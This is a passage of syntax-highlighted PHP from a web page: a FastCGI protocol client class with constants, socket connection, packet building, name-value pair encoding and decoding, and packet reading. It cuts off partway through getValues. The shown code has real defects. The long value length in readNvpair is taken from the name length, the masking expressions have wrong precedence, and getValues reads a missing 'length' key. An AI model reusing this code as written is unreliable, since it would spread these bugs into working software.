class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token 